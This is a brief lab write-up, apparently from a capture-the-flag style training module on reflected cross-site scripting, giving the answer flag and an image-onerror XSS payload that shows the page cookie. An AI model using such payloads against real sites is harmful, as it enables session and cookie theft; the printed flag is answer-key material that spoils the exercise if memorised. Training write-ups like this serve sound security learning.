# Reflected XSS
## Questions
1. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url. **Answer: HTB{r3fl3c73d_b4ck_2_m3}**
   - Use this payload: `<img/src/onerror=alert(document.cookie)>`